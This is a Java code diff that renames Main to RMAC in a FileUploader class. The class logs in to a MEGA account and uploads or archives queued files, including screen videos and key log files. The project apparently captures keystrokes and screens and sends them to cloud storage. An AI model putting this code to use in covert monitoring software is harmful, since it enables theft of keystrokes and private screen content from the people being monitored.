@@ -1,6 +1,6 @@
 package com.rmac.core;
 
-import com.rmac.Main;
+import com.rmac.RMAC;
 import com.rmac.utils.ArchiveFileType;
 import com.rmac.utils.Uploadable;
 import java.io.File;
@@ -29,7 +29,7 @@ public final class FileUploader {
    */
   public FileUploader() {
     if (MegaClient.startServer()) {
-      MegaClient.login(Main.config.getMegaUser(), Main.config.getMegaPass(), false);
+      MegaClient.login(RMAC.config.getMegaUser(), RMAC.config.getMegaPass(), false);
     }
   }
 
@@ -51,13 +51,13 @@ public final class FileUploader {
       archive = true;
     }
 
-    if ((type == ArchiveFileType.SCREEN && !Main.config.getVideoUpload()) ||
-        (type == ArchiveFileType.KEY && !Main.config.getLogFileUpload())) {
+    if ((type == ArchiveFileType.SCREEN && !RMAC.config.getVideoUpload()) ||
+        (type == ArchiveFileType.KEY && !RMAC.config.getLogFileUpload())) {
       archive = true;
     }
 
     if (archive) {
-      Main.archiver.moveToArchive(fileToUpload.getAbsolutePath(), type);
+      RMAC.archiver.moveToArchive(fileToUpload.getAbsolutePath(), type);
       return;
     }
 
@@ -88,7 +88,7 @@ public final class FileUploader {
    * cap has not reached.
    */
   private synchronized void doUploads() {
-    while (runningUploads < Main.config.getMaxParallelUploads()) {
+    while (runningUploads < RMAC.config.getMaxParallelUploads()) {
       Uploadable u = queue.poll();
       if (u != null) {
         u.execute();
